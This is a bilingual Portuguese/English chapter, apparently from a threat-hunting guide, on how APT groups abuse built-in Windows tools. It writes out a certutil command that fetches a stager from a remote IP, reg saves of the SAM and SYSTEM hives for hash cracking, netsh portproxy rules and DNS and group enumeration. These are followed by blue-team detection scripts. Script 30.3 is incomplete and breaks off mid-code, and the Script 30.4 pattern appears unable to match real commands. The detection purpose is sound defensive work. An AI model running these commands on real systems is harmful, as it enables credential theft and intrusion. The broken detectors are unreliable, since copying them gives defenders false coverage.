2. Contexto e Relevância / Context and Relevance Original

Os atores de ameaça modernos dependem cada vez mais de utilitários Windows confiáveis em vez de malware tradicional para evitar deteção em ambientes empresariais. Os binários nativos são assinados pela Microsoft, correm fora do contexto de aplicações não confiáveis, e misturam-se com atividade administrativa rotineira. Esta é a essência do LOLBAS (Living Off the Land Binaries and Scripts). APTs chineses, em particular, são conhecidos por usar estas ferramentas para reconhecimento, movimento lateral e exfiltração. Modern threat actors increasingly rely on trusted Windows utilities instead of traditional malware to avoid detection inside enterprise environments. Native binaries are Microsoft-signed, run outside the context of untrusted applications, and blend with routine administrative activity. This is the essence of LOLBAS (Living Off the Land Binaries and Scripts). Chinese APTs, in particular, are known to use these tools for reconnaissance, lateral movement, and exfiltration.

3. Certutil — Download de Payloads Original

O Certutil é uma das utilidades LOLBAS mais abusadas. Foi desenhada para gerir certificados, mas como suporta downloads de URLs remotas, os hackers usam-na para obter malware adicional de servidores C2. Grupos como o APT41 usaram Certutil logo após obter acesso, para descarregar um stager Cobalt Strike após um backdoor BEACON. Certutil is one of the most commonly abused LOLBAS utilities. It was designed to manage certificates, but because it supports downloading files from remote URLs, hackers use it to retrieve additional malware from C2 servers. Groups like APT41 used Certutil shortly after gaining access, to download a Cobalt Strike stager after a BEACON backdoor. 
PS > certutil -urlcache -split -f http://192.168.56.106:443/stager.exe
O parâmetro -urlcache ativa o cache de URL, -split divide o download, e -f força a sobrescrita. O ficheiro descarregado é depois executado para entregar shellcode. -urlcache enables URL cache, -split splits the download, and -f forces overwrite. The downloaded file is then executed to deliver shellcode.

4. Net — Reconhecimento de Privilégios Original

O comando net é uma ferramenta administrativa clássica para gerir contas, grupos e partilhas. Os hackers usam-no durante reconhecimento para compreender a estrutura de privilégios e identificar contas que podem conceder acesso elevado. The net command is a classic administrative tool for managing accounts, groups, and shares. Hackers use it during reconnaissance to understand the privilege structure and identify accounts that may grant elevated access. 
PS > net localgroup administrators
PS > net group /dom
PS > net group "Domain Admins" /dom
Estes comandos revelam que utilizadores pertencem a grupos administrativos críticos. Se os hackers descobrirem contas com privilégios elevados, podem tentar roubo de credenciais ou escalada de privilégios direcionada a esses utilizadores. These commands reveal which users belong to critical administrative groups. If hackers discover accounts with elevated privileges, they may attempt credential theft or privilege escalation targeting those users.

5. Reg — Extração de Credenciais e Hives Original

O reg permite interagir diretamente com o registo Windows. Os atores de ameaça consultam localizações associadas a PuTTY, OpenSSH e RealVNC, porque estas ferramentas às vezes armazenam credenciais ou detalhes de conexão. Também guardam hives SAM e SYSTEM, que contêm hashes de password e chaves criptográficas para cracking offline. reg allows direct interaction with the Windows registry. Threat actors query locations associated with PuTTY, OpenSSH, and RealVNC, because these tools sometimes store credentials or connection details. They also save SAM and SYSTEM hives, which contain password hashes and cryptographic keys for offline cracking. 
PS > reg.exe save hklm\sam C:\sam.save
PS > reg.exe save hklm\system C:\system.save
Estes ficheiros podem depois ser exfiltrados e processados com ferramentas como secretsdump.py para extrair hashes NTLM. These files can then be exfiltrated and processed with tools like secretsdump.py to extract NTLM hashes.

6. Netsh — Portproxy e Recon de Firewall Original

O netsh é uma ferramenta de rede poderosa. Os hackers usam-no para reconhecimento (regras de firewall, interfaces, rotas) e para modificar configurações de rede que suportam operações maliciosas. Uma das técnicas mais relevantes é a criação de portproxy, que transforma a vítima num proxy covert para movimento lateral. netsh is a powerful network tool. Hackers use it for reconnaissance (firewall rules, interfaces, routes) and to modify network configurations that support malicious operations. One of the most relevant techniques is creating a portproxy, which turns the victim into a covert proxy for lateral movement.

6.1 Recon

PS > netsh interface portproxy show all
PS > netsh advfirewall show allprofiles
PS > netsh advfirewall firewall show rule name=all

6.2 Criar Portproxy

PS > cmd.exe /c netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=127.0.0.1 connectport=8443
PS > cmd.exe /c netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=50100 connectaddress=127.0.0.1 connectport=1433
Estas regras criam entradas de registo em HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp\. Rastrear que conta fez a alteração é crucial na investigação. These rules create registry entries under HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp\. Tracking which account made the change is crucial during investigation.

7. Dnscmd — Enumeração de DNS Original

O dnscmd gere servidores DNS Microsoft. Durante intrusões, os hackers usam-no para enumerar zonas e registos DNS, revelando informação valiosa sobre a infraestrutura interna e hostnames. dnscmd manages Microsoft DNS servers. During intrusions, hackers use it to enumerate DNS zones and records, revealing valuable information about internal infrastructure and hostnames. 
PS > dnscmd . /enumrecords /zone {REDACTED}
PS > dnscmd . /enumzones
PS > dnscmd . /enumrecords {REDACTED} . /additional
Estes comandos ajudam os atacantes a mapear a rede interna, identificar recursos de domínio e descobrir sistemas que podem ser alvos de movimento lateral. These commands help attackers map the internal network, identify domain resources, and discover systems that may become targets for lateral movement.

8. PowerShell — Revisão de Logons Original

O PowerShell é flexível e poderoso, e também é pesadamente abusado. O artigo documenta comandos usados para rever atividade de login num sistema comprometido. PowerShell is flexible and powerful, and it's also heavily abused. The article documents commands used to review login activity on a compromised system. 
PS > Get-EventLog security -instanceid 4624
PS > Get-EventLog -LogName System | Select-Object -Property UserName...
O Event ID 4624 regista logons bem-sucedidos. Os atacantes usam-no para identificar contas ativas e planear movimento lateral. Event ID 4624 logs successful logons. Attackers use it to identify active accounts and plan lateral movement.

9. Scripts de Impacto / Impact Scripts Impacto Complementar

Os scripts abaixo ajudam o blue team a detetar a atividade LOLBAS descrita neste capítulo. The scripts below help the blue team detect the LOLBAS activity described in this chapter.

9.1 Script 30.1 — Deteção de Certutil Download / Certutil Download Detection

# Script 30.1 - Certutil Download Detection
$out = ".\certutil-detect.csv"
$hits = @()
Get-WinEvent -LogName Security -MaxEvents 3000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4688 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $cmd = ($xml.Event.EventData.Data | Where-Object Name -eq "CommandLine").'#text'
    if ($cmd -match "certutil.*-urlcache" -or $cmd -match "certutil.*-split") {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Command=$cmd }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Certutil downloads: $($hits.Count) -> $out" -ForegroundColor Red

9.2 Script 30.2 — Deteção de Portproxy / Portproxy Detection

# Script 30.2 - Portproxy Detection
$out = ".\portproxy-detect.csv"
$key = "HKLM:\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp"
$hits = @()
if (Test-Path $key) {
  Get-ChildItem $key | ForEach-Object {
    $props = Get-ItemProperty $_.PSPath
    $hits += [PSCustomObject]@{ Listen=$_.PSChildName; ConnectAddress=$props.ConnectAddress; ConnectPort=$props.ConnectPort }
  }
}
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Portproxy entries: $($hits.Count) -> $out" -ForegroundColor Red
$hits | Format-Table -AutoSize

9.3 Script 30.3 — Deteção de Dnscmd Enum / Dnscmd Enumeration Detection

# Script 30.3 - Dnscmd Enumeration Detection
$out = ".\dnscmd-detect.csv"
$hits = @()

  Where-Object { $_.Id -eq 4688 } | ForEach-Object {

9.4 Script 30.4 — Deteção de Reg Save SAM/SYSTEM / Reg Save Detection

# Script 30.4 - Reg Save SAM/SYSTEM Detection
$out = ".\regsave-detect.csv"
$hits = @()
Get-WinEvent -LogName Security -MaxEvents 3000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4688 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $cmd = ($xml.Event.EventData.Data | Where-Object Name -eq "CommandLine").'#text'
    if ($cmd -match "reg.*save.*hklm\\\\sam" -or $cmd -match "reg.*save.*hklm\\\\system") {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Command=$cmd }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Reg save SAM/SYSTEM: $($hits.Count) -> $out" -ForegroundColor Red
